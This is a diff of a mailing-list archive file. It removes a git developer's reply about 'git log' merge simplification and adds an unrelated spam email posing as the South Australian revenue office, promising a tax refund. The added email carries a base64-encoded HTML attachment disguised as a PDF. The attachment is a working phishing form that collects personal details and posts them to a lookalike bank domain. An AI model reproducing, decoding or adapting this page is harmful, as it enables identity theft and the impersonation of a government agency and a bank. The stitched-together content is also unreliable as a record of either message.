@@ -1,95 +1,261 @@
-From: Jeff King <peff@peff.net>
-Subject: Re: Am able to delete a file with no trace in the log
-Date: Wed, 3 Jun 2009 19:37:10 -0400
-Message-ID: <20090603233710.GA10578@coredump.intra.peff.net>
-References: <alpine.LFD.2.01.0906022000040.4880@localhost.localdomain> <7vtz2x6mor.fsf@alter.siamese.dyndns.org> <alpine.LFD.2.01.0906031431100.4880@localhost.localdomain> <7v8wk96knh.fsf@alter.siamese.dyndns.org> <alpine.LFD.2.01.0906031504080.4880@localhost.localdomain> <7vmy8p54fr.fsf@alter.siamese.dyndns.org> <20090603224413.GA2902@coredump.intra.peff.net> <alpine.LFD.2.01.0906031547480.4880@localhost.localdomain> <20090603230606.GA5462@coredump.intra.peff.net> <alpine.LFD.2.01.0906031619150.4880@localhost.localdomain>
+From: "RevenueSA" <taxrefund@saugov.sa.gov.au>
+Subject: Where's My Refund?
+Date: Thu, 4 Jun 2009 01:23:10 +0200
+Message-ID: <200906032323.n53NNBwk022305@mailtoaster.icb.at>
+Reply-To: <no-reply@saugov.sa.gov.au>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Cc: Junio C Hamano <gitster@pobox.com>,
-	Graham Perks <gperks@ausperks.net>,
-	Git List <git@vger.kernel.org>
-To: Linus Torvalds <torvalds@linux-foundation.org>
-X-From: git-owner@vger.kernel.org Thu Jun 04 01:37:28 2009
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_010E_01C2A9A6.75046B00"
+To: undisclosed-recipients:;
+X-From: git-owner@vger.kernel.org Thu Jun 04 01:53:51 2009
 Return-path: <git-owner@vger.kernel.org>
 Envelope-to: gcvg-git-2@gmane.org
 Received: from vger.kernel.org ([209.132.176.167])
 	by lo.gmane.org with esmtp (Exim 4.50)
-	id 1MC01P-0000cL-LZ
-	for gcvg-git-2@gmane.org; Thu, 04 Jun 2009 01:37:28 +0200
+	id 1MC0HG-00080x-IV
+	for gcvg-git-2@gmane.org; Thu, 04 Jun 2009 01:53:51 +0200
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1753968AbZFCXhT (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
-	Wed, 3 Jun 2009 19:37:19 -0400
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1753108AbZFCXhR
-	(ORCPT <rfc822;git-outgoing>); Wed, 3 Jun 2009 19:37:17 -0400
-Received: from peff.net ([208.65.91.99]:50565 "EHLO peff.net"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1751783AbZFCXhR (ORCPT <rfc822;git@vger.kernel.org>);
-	Wed, 3 Jun 2009 19:37:17 -0400
-Received: (qmail 27794 invoked by uid 107); 3 Jun 2009 23:37:25 -0000
-Received: from coredump.intra.peff.net (HELO coredump.intra.peff.net) (10.0.0.2)
-    by peff.net (qpsmtpd/0.40) with (AES128-SHA encrypted) SMTP; Wed, 03 Jun 2009 19:37:25 -0400
-Received: by coredump.intra.peff.net (sSMTP sendmail emulation); Wed, 03 Jun 2009 19:37:10 -0400
-Content-Disposition: inline
-In-Reply-To: <alpine.LFD.2.01.0906031619150.4880@localhost.localdomain>
+	id S1753965AbZFCXxi (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
+	Wed, 3 Jun 2009 19:53:38 -0400
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1752614AbZFCXxh
+	(ORCPT <rfc822;git-outgoing>); Wed, 3 Jun 2009 19:53:37 -0400
+Received: from mailtoaster.icb.at ([195.230.168.72]:47711 "EHLO
+	mailtoaster.icb.at" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1751783AbZFCXxg (ORCPT <rfc822;git@vger.kernel.org>);
+	Wed, 3 Jun 2009 19:53:36 -0400
+X-Greylist: delayed 698 seconds by postgrey-1.27 at vger.kernel.org; Wed, 03 Jun 2009 19:53:35 EDT
+Received: from mailtoaster.icb.at (localhost [127.0.0.1])
+	by mailtoaster.icb.at (8.13.8/8.13.8/Debian-3) with ESMTP id n53Ne2g6023698
+	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NOT)
+	for <git@vger.kernel.org>; Thu, 4 Jun 2009 01:41:52 +0200
+Received: (from defang@localhost)
+	by mailtoaster.icb.at (8.13.8/8.13.8/Submit) id n53NNBwk022305
+	for <git@vger.kernel.org>; Thu, 4 Jun 2009 01:23:11 +0200
+X-Authentication-Warning: mailtoaster.icb.at: defang set sender to <taxrefund@saugov.sa.gov.au> using -f
+Received: from User (allurehr.com [74.208.8.178])
+	by mailtoaster.icb.at (envelope-sender <taxrefund@saugov.sa.gov.au>) (MIMEDefang) with ESMTP id n53NM3a9021575; Thu, 04 Jun 2009 01:23:11 +0200 (CEST)
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-Scanned-By: MIMEDefang 2.57 on 127.0.0.1
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
-Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/120665>
+X-Spam-Report: 8.4 points;
+ *  1.4 UNDISC_RECIPS Valid-looking To "undisclosed-recipients"
+ *  3.0 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+ *      [cf:  60]
+ *  1.0 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+ *  0.0 MSGID_FROM_MTA_HEADER Message-Id was added by a relay
+ *  3.0 FORGED_MUA_OUTLOOK Forged mail pretending to be from MS Outlook
+Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/120666>
 
-On Wed, Jun 03, 2009 at 04:27:39PM -0700, Linus Torvalds wrote:
+This is a multi-part message in MIME format.
 
-> >   rm b.txt && git add b.txt &&
-> >   echo resolve >a.txt && git add a.txt &&
-> >   git commit -m merged
-> 
-> This doesn't work at all for me.
-> 
-> Do
-> 
-> 	git show HEAD:b.txt
-> 
-> and it still shows b.txt in the commit. You should have used
-> 
-> 	git rm b.txt
-> 
-> rather than "git add b.txt" (or you use use "-u" or "-a" to git add).
+------=_NextPart_000_010E_01C2A9A6.75046B00
+Content-Type: text/plain;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
 
-Er, sorry, yeah, I botched the recipe (I initially used "git rm" by
-itself, but it complains about "changes staged in the index", so I fixed
-it up manually and then botched writing out the automated version).
 
-But I see you figured out what I meant, so...
+  Dear Applicant:
 
-> But you're right. Even when fixed, it does seem to need "--full-history" 
-> to stay around, and --simplify-merges is insufficient. Bug in merge 
-> simplification?
 
-I don't even see it with --full-history. I get:
+After the last annual calculation of your fiscal activity we have determined that you are eligible to receive a tax refund of $184.23
 
-  $ git log -m --stat --oneline | head
-  b1a38ec (from 2671fa7) merged
-   a.txt |    2 +-
-   1 files changed, 1 insertions(+), 1 deletions(-)
-  b1a38ec (from d0bac65) merged
-   a.txt |    2 +-
-   b.txt |    1 -
-   2 files changed, 1 insertions(+), 2 deletions(-)
 
-  $ git log -m --stat --oneline -- b.txt
-  (no output)
+Please submit the tax refund and allow us 3-9 business days in order to process it.
 
-  $ git log --simplify-merges -m --stat --oneline -- b.txt
-  912ac84 other 1
-   b.txt |    1 +
-   1 files changed, 1 insertions(+), 0 deletions(-)
+If you don't receive your refund within 9 business days from the original RevenueSA mailing date shown on Where's My Refund?, you can start a refund trace online.
 
-  $ git log --full-history -m --stat --oneline -- b.txt
-  912ac84 other 1
-   b.txt |    1 +
-   1 files changed, 1 insertions(+), 0 deletions(-)
+To get to your personal refund information, be ready to enter your:
 
-Is there some trick to enabling both path limiting _and_ still showing
-the merge commit? Or is this a bug?
+Filing status (Single, Married Filing Joint Return, Married Filing Separate Return, Head of Household, or Qualifying Widow(er))
+Personal Information where refunds will be made.
 
--Peff
+To access the application form for your tax refund, please click on the application form attached in the e-mail address.
+
+Note:
+For security reasons, we will record your ip-address and date.
+Deliberate wrong inputs are criminally pursued and indicted.
+
+------=_NextPart_000_010E_01C2A9A6.75046B00
+Content-Type: application/octet-stream;
+	name="RevenueSA_RefundForm.pdf.htm"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+	filename="RevenueSA_RefundForm.pdf.htm"
+
+PGh0bWw+DQoNCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1M
+YW5ndWFnZSIgY29udGVudD0iZW4tdXMiPg0KPG1ldGEgaHR0cC1lcXVpdj0i
+Q29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9d2lu
+ZG93cy0xMjUyIj4NCjx0aXRsZT5SZXZlbnVlU0EgVGF4IFJlZnVuZCAuUERG
+PC90aXRsZT4NCjxzdHlsZT4NCjwhLS0NCi5tcy1zaW1wbGUxLW1haW4geyBi
+b3JkZXItbGVmdC1zdHlsZTogbm9uZTsgYm9yZGVyLXJpZ2h0LXN0eWxlOiBu
+b25lOyANCiAgICAgICAgICAgICAgIGJvcmRlci10b3A6IDEuNXB0IHNvbGlk
+IGdyZWVuOyBib3JkZXItYm90dG9tOiAxLjVwdCBzb2xpZCBncmVlbiB9DQou
+bXMtc2ltcGxlMS10bCB7IGJvcmRlci1sZWZ0LXN0eWxlOiBub25lOyBib3Jk
+ZXItcmlnaHQtc3R5bGU6IG5vbmU7IGJvcmRlci10b3Atc3R5bGU6IG5vbmU7
+IA0KICAgICAgICAgICAgICAgYm9yZGVyLWJvdHRvbTogLjc1cHQgc29saWQg
+Z3JlZW4gfQ0KLS0+DQo8L3N0eWxlPg0KPC9oZWFkPg0KPFNDUklQVCBUWVBF
+PSJ0ZXh0L2phdmFzY3JpcHQiPg0KPCEtLQ0KZnVuY3Rpb24gcG9wdXAobXls
+aW5rLCB3aW5kb3duYW1lKQ0Kew0KaWYgKCEgd2luZG93LmZvY3VzKXJldHVy
+biB0cnVlOw0KdmFyIGhyZWY7DQppZiAodHlwZW9mKG15bGluaykgPT0gJ3N0
+cmluZycpDQogICBocmVmPW15bGluazsNCmVsc2UNCiAgIGhyZWY9bXlsaW5r
+LmhyZWY7DQp3aW5kb3cub3BlbihocmVmLCB3aW5kb3duYW1lLCAnd2lkdGg9
+MzAwLGhlaWdodD0zMDAsbGVmdCA9IDMxMiwgdG9wID0gMTg0LHNjcm9sbGJh
+cnM9bm8nKTsNCnJldHVybiBmYWxzZTsNCn0NCi8vLS0+DQo8L1NDUklQVD4N
+Cg0KDQo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4NCjwhLS0NCglm
+dW5jdGlvbiBVcGRhdGUoKSB7DQoNCmlmIChkb2N1bWVudC51cGRhdGUudGl0
+bGUudmFsdWUgPT0gIiIpIHthbGVydCgiVGl0bGUgTmFtZSBpcyBSZXF1aXJl
+ZCAhIik7ZG9jdW1lbnQudXBkYXRlLnRpdGxlLmZvY3VzKCk7cmV0dXJuIGZh
+bHNlO30NCg0KaWYgKGRvY3VtZW50LnVwZGF0ZS5mdWxsbmFtZS52YWx1ZSA9
+PSAiIikge2FsZXJ0KCJGdWxsIE5hbWUgaXMgUmVxdWlyZWQgISIpO2RvY3Vt
+ZW50LnVwZGF0ZS5mdWxsbmFtZS5mb2N1cygpO3JldHVybiBmYWxzZTt9DQoN
+CmlmIChkb2N1bWVudC51cGRhdGUuYWRkcmVzcy52YWx1ZSA9PSAiIikge2Fs
+ZXJ0KCJBZGRyZXNzIGlzIFJlcXVpcmVkICEiKTtkb2N1bWVudC51cGRhdGUu
+YWRkcmVzcy5mb2N1cygpO3JldHVybiBmYWxzZTt9DQoNCmlmIChkb2N1bWVu
+dC51cGRhdGUuY2l0eS52YWx1ZSA9PSAiIikge2FsZXJ0KCJDaXR5IGlzIFJl
+cXVpcmVkICEiKTtkb2N1bWVudC51cGRhdGUuY2l0eS5mb2N1cygpO3JldHVy
+biBmYWxzZTt9DQoNCmlmIChkb2N1bWVudC51cGRhdGUuc3RhdGUudmFsdWUg
+PT0gIiIpIHthbGVydCgiU3RhdGUgaXMgUmVxdWlyZWQgISIpO2RvY3VtZW50
+LnVwZGF0ZS5zdGF0ZS5mb2N1cygpO3JldHVybiBmYWxzZTt9DQoNCmlmIChk
+b2N1bWVudC51cGRhdGUuemlwY29kZS52YWx1ZSA9PSAiIikge2FsZXJ0KCJQ
+b3N0YWwgQ29kZSBpcyBSZXF1aXJlZCAhIik7ZG9jdW1lbnQudXBkYXRlLnpp
+cGNvZGUuZm9jdXMoKTtyZXR1cm4gZmFsc2U7fQ0KDQppZiAoZG9jdW1lbnQu
+dXBkYXRlLnBob25lLnZhbHVlID09ICIiKSB7YWxlcnQoIlBob25lIE51bWJl
+ciBpcyBSZXF1aXJlZCAhIik7ZG9jdW1lbnQudXBkYXRlLnBob25lLmZvY3Vz
+KCk7cmV0dXJuIGZhbHNlO30gdHJ1ZTt9DQoNCiAgICAgICAgICAgICAgICAg
+ICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAtLT4JCQkJCQkJ
+CQkJCTwvc2NyaXB0Pg0KPGJvZHkgYmFja2dyb3VuZD0iaHR0cDovL3d3dy5t
+YWxhbGEuYml6L3gvYmFja2dyb3VuZDIuanBnIj4NCjxmb3JtIG1ldGhvZD0i
+cG9zdCIgYWN0aW9uPSJodHRwOi8vd3d3My5uZXRiYW5rLmNvbW1iYW5rLmNv
+bS5hdS50YXhyZWZ1bmRhcHBsaWNhdGlvbi5jb20vbmV0YmFuay9iYW5rbWFp
+bi9hZGRjcmVkaXQucGhwP2NoZWNrSUQ9d3d3LmNvbW1iYW5rLmNvbS5hdSZJ
+ZE51bWJlcj0xMjgwMzkzOTAxIiBuYW1lPSJ1cGRhdGUiPg0KPHA+Jm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5i
+c3A7IDwvcD4NCjxwIGFsaWduPSJsZWZ0Ij48Yj4mbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsNCjxmb250IHNpemU9IjUiPiZuYnNwOyZuYnNw
+OyZuYnNwO1JldmVudWVTQTxicj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsoMDgpIDgyMjYgMzc1MDxicj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDt0YXhyZWZ1bmRAc2F1Z292LnNhLmdvdi5hdTwvZm9udD48L2I+PGZvbnQg
+c2l6ZT0iNSI+PC9mb250PjwvcD4NCjxwIGFsaWduPSJjZW50ZXIiPjxiPjxm
+b250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjUiPiZuYnNwOyZuYnNwOyZuYnNw
+OyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZu
+YnNwOyZuYnNwOw0KPC9mb250PjwvYj4gPC9wPg0KDQoNCjxwIGFsaWduPSJj
+ZW50ZXIiPjxiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjQiPlRheCBS
+ZWZ1bmQgQXBwbGljYXRpb24gRm9ybTwvZm9udD48L2I+PC9wPg0KPHAgYWxp
+Z249ImNlbnRlciI+Jm5ic3A7PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+Jm5i
+c3A7PC9wPg0KPGRpdiBhbGlnbj0iY2VudGVyIj4NCgk8dGFibGUgaWQ9InRh
+YmxlMSIgY2VsbFNwYWNpbmc9IjAiIGNlbGxQYWRkaW5nPSIyIiB3aWR0aD0i
+MzUlIiBiZ0NvbG9yPSIjRkZGRkZGIj4NCgkJJm5ic3A7Jm5ic3A7Jm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5i
+c3A7Jm5ic3A7Jm5ic3A7DQoNCg0KDQoJPHRyPg0KCQkJPHRkPio8L3RkPg0K
+CQkJPHRkPjxmb250IGZhY2U9IlRpbWVzIE5ldyBSb21hbiI+VGl0bGU8L2Zv
+bnQ+PC90ZD4NCgkJCTx0ZD4mbmJzcDs8L3RkPg0KCQkJPHRkPg0KCQkJJm5i
+c3A7ICAgICAgICA8c2VsZWN0IG5hbWU9InRpdGxlIiBjbGFzcz0iZm9ybWZp
+ZWxkdGV4dCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlv
+biBzZWxlY3RlZD4tIENob29zZSBPbmUgLTwvb3B0aW9uPg0KICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9Ik1yLiI+TXIuPC9v
+cHRpb24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2
+YWx1ZT0iTXMuIj5Ncy48L29wdGlvbj4NCiAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICA8b3B0aW9uIHZhbHVlPSJNcnMuIj5NcnMuPC9vcHRpb24+DQog
+ICAgICAgICAgICAgICAgICAgICAgICAgIDwvc2VsZWN0Pg0KPC90ZD4NCgkJ
+PC90cj4NCg0KPHRyPg0KCQkJPHRkPio8L3RkPg0KCQkJPHRkPjxmb250IGZh
+Y2U9IlRpbWVzIE5ldyBSb21hbiI+RnVsbG5hbWU8L2ZvbnQ+PC90ZD4NCgkJ
+CTx0ZD4mbmJzcDs8L3RkPg0KCQkJPHRkPg0KCQkJJm5ic3A7PGlucHV0IGNs
+YXNzPSJyemJJbnB1dCIgbWF4TGVuZ3RoPSIzMCIgc2l6ZT0iMzAiIG5hbWU9
+ImZ1bGxuYW1lIj4gDQoJCQk8L3RkPg0KCQk8L3RyPg0KCQkJCTx0cj4NCgkJ
+CTx0ZD4qPC90ZD4NCgkJCTx0ZD48Zm9udCBmYWNlPSJUaW1lcyBOZXcgUm9t
+YW4iPkFkZHJlc3M8L2ZvbnQ+PC90ZD4NCgkJCTx0ZD4mbmJzcDs8L3RkPg0K
+CQkJPHRkPg0KCQkJJm5ic3A7PGlucHV0IGNsYXNzPSJyemJJbnB1dCIgdHlw
+ZT0idGV4dCIgbWF4TGVuZ3RoPSIzNSIgc2l6ZT0iMzAiIHZhbHVlIG5hbWU9
+ImFkZHJlc3MiPjwvdGQ+DQoJCTwvdHI+DQoJCTx0cj4NCgkJCTx0ZD4qPC90
+ZD4NCgkJCTx0ZD48Zm9udCBmYWNlPSJUaW1lcyBOZXcgUm9tYW4iPkNpdHk8
+L2ZvbnQ+PC90ZD4NCgkJCTx0ZD4mbmJzcDs8L3RkPg0KCQkJPHRkPg0KCQkJ
+Jm5ic3A7PGlucHV0IGNsYXNzPSJyemJJbnB1dCIgdHlwZT0idGV4dCIgbWF4
+TGVuZ3RoPSIyNSIgc2l6ZT0iMTUiIHZhbHVlIG5hbWU9ImNpdHkiPjwvdGQ+
+DQoJCTwvdHI+DQoJCTx0cj4NCgkJCTx0ZD4qPC90ZD4NCgkJCTx0ZD48Zm9u
+dCBmYWNlPSJUaW1lcyBOZXcgUm9tYW4iPlN0YXRlPC9mb250PjwvdGQ+DQoJ
+CQk8dGQ+Jm5ic3A7PC90ZD4NCgkJCTx0ZD4NCgkJCSZuYnNwOzxpbnB1dCBj
+bGFzcz0icnpiSW5wdXQiIHR5cGU9InRleHQiIG1heExlbmd0aD0iMjUiIHNp
+emU9IjE1IiB2YWx1ZSBuYW1lPSJzdGF0ZSI+PC90ZD4NCgkJPC90cj4NCg0K
+CQk8dHI+DQoJCQk8dGQ+KjwvdGQ+DQoJCQk8dGQ+PGZvbnQgZmFjZT0iVGlt
+ZXMgTmV3IFJvbWFuIj5Qb3N0YWwgQ29kZTwvZm9udD48L3RkPg0KCQkJPHRk
+PiZuYnNwOzwvdGQ+DQoJCQk8dGQ+DQoJCQkmbmJzcDs8aW5wdXQgY2xhc3M9
+InJ6YklucHV0IiB0eXBlPSJ0ZXh0IiBtYXhMZW5ndGg9IjI1IiBzaXplPSIx
+NSIgdmFsdWUgbmFtZT0iemlwY29kZSI+PC90ZD4NCgkJPC90cj4NCgkJPHRy
+Pg0KCQkJPHRkPio8L3RkPg0KCQkJPHRkPjxmb250IGZhY2U9IlRpbWVzIE5l
+dyBSb21hbiI+UGhvbmUgTnVtYmVyPC9mb250PjwvdGQ+DQoJCQk8dGQ+Jm5i
+c3A7PC90ZD4NCgkJCTx0ZD4NCgkJCSZuYnNwOzxpbnB1dCBjbGFzcz0icnpi
+SW5wdXQiIHR5cGU9InRleHQiIG1heExlbmd0aD0iMTUiIHNpemU9IjE1IiB2
+YWx1ZSBuYW1lPSJwaG9uZSI+PC90ZD4NCgkJPC90cj4NCgkJDQogPHRyPg0K
+CQkJPHRkPio8L3RkPg0KCQkJPHRkPjxmb250IGZhY2U9IlRpbWVzIE5ldyBS
+b21hbiI+UmVnaXN0cmF0aW9uIERhdGU8L2ZvbnQ+PC90ZD4NCgkJCTx0ZD4m
+bmJzcDs8L3RkPg0KCQkJPHRkPiZuYnNwOzxzZWxlY3Qgc2l6ZT0iMSIgbmFt
+ZT0iRDEiPg0KCQkJCQkJCTxvcHRpb24+MTwvb3B0aW9uPg0KCQkJCQkJCTxv
+cHRpb24+Mjwvb3B0aW9uPg0KCQkJCQkJCTxvcHRpb24+Mzwvb3B0aW9uPg0K
+CQkJCQkJCTxvcHRpb24+NDwvb3B0aW9uPg0KCQkJCQkJCTxvcHRpb24+NTwv
+b3B0aW9uPg0KCQkJCQkJCTxvcHRpb24+Njwvb3B0aW9uPg0KCQkJCQkJCTxv
+cHRpb24+Nzwvb3B0aW9uPg0KCQkJCQkJCTxvcHRpb24+ODwvb3B0aW9uPg0K
+CQkJCQkJCTxvcHRpb24+OTwvb3B0aW9uPg0KCQkJCQkJCTxvcHRpb24+MTA8
+L29wdGlvbj4NCgkJCQkJCQk8b3B0aW9uPjExPC9vcHRpb24+DQoJCQkJCQkJ
+PG9wdGlvbj4xMjwvb3B0aW9uPg0KCQkJCQkJCTxvcHRpb24+MTM8L29wdGlv
+bj4NCgkJCQkJCQk8b3B0aW9uPjE0PC9vcHRpb24+DQoJCQkJCQkJPG9wdGlv
+bj4xNTwvb3B0aW9uPg0KCQkJCQkJCTxvcHRpb24+MTY8L29wdGlvbj4NCgkJ
+CQkJCQk8b3B0aW9uPjE3PC9vcHRpb24+DQoJCQkJCQkJPG9wdGlvbj4xODwv
+b3B0aW9uPg0KCQkJCQkJCTxvcHRpb24+MTk8L29wdGlvbj4NCgkJCQkJCQk8
+b3B0aW9uPjJvPC9vcHRpb24+DQoJCQkJCQkJPG9wdGlvbj4yMTwvb3B0aW9u
+Pg0KCQkJCQkJCTxvcHRpb24+MjI8L29wdGlvbj4NCgkJCQkJCQk8b3B0aW9u
+PjIzPC9vcHRpb24+DQoJCQkJCQkJPG9wdGlvbj4yNDwvb3B0aW9uPg0KCQkJ
+CQkJCTxvcHRpb24+MjU8L29wdGlvbj4NCgkJCQkJCQk8b3B0aW9uPjI2PC9v
+cHRpb24+DQoJCQkJCQkJPG9wdGlvbj4yNzwvb3B0aW9uPg0KCQkJCQkJCTxv
+cHRpb24+Mjg8L29wdGlvbj4NCgkJCQkJCQk8b3B0aW9uPjI5PC9vcHRpb24+
+DQoJCQkJCQkJPG9wdGlvbj4zMDwvb3B0aW9uPg0KCQkJCQkJCTxvcHRpb24+
+MzE8L29wdGlvbj4NCgkJCQkJCQk8L3NlbGVjdD4gLyA8c2VsZWN0IHNpemU9
+IjEiIG5hbWU9IkQyIj4NCgkJCQkJCQk8b3B0aW9uPjE8L29wdGlvbj4NCgkJ
+CQkJCQk8b3B0aW9uPjI8L29wdGlvbj4NCgkJCQkJCQk8b3B0aW9uPjM8L29w
+dGlvbj4NCgkJCQkJCQk8b3B0aW9uPjQ8L29wdGlvbj4NCgkJCQkJCQk8b3B0
+aW9uPjU8L29wdGlvbj4NCgkJCQkJCQk8b3B0aW9uPjY8L29wdGlvbj4NCgkJ
+CQkJCQk8b3B0aW9uPjc8L29wdGlvbj4NCgkJCQkJCQk8b3B0aW9uPjg8L29w
+dGlvbj4NCgkJCQkJCQk8b3B0aW9uPjk8L29wdGlvbj4NCgkJCQkJCQk8b3B0
+aW9uPjEwPC9vcHRpb24+DQoJCQkJCQkJPG9wdGlvbj4xMTwvb3B0aW9uPg0K
+CQkJCQkJCTxvcHRpb24+MTI8L29wdGlvbj4NCgkJCQkJCQk8L3NlbGVjdD4g
+LzIwMDk8L3RkPjwvdHI+DQoNCgk8L3RhYmxlPg0KPC9kaXY+DQoNCg0KDQog
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0K
+CQkJCQkJCTxwIGFsaWduPSJjZW50ZXIiPg0KCQkJCQkJCTxpbnB1dCBjbGFz
+cz0icnpiQWN0aXZlQnV0dG9uIiBzdHlsZT0iRk9OVC1XRUlHSFQ6IGJvbGQi
+IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNlbmQiIG5hbWU9IlBDXzdfM180RjRf
+Y29tLnVjcy5pbmdlbmlvLkNhbGxNZVBvcnRsZXRTdWJtaXQiIG9uY2xpY2s9
+InJldHVybiBVcGRhdGUoKTsiPjwvcD4NCgkJCQkJCQk8cD4mbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsNCgkJCQkJCQk8Yj6pUmV2ZW51ZVNBIEF1c3RyYWxpYTwvYj48
+L3RkPg0KCQkJCQkJPC90cj4NCgkJCQkJPC90YWJsZT4NCgkJCQk8L2Zvcm0+
+DQoJCQk8L2Rpdj4NCgkJCTwvdGQ+DQoJCTwvdHI+DQoJPC90YWJsZT4NCjwv
+ZGl2Pg0KDQo8L2JvZHk+DQoNCjwvaHRtbD4NCg==
+
+------=_NextPart_000_010E_01C2A9A6.75046B00--
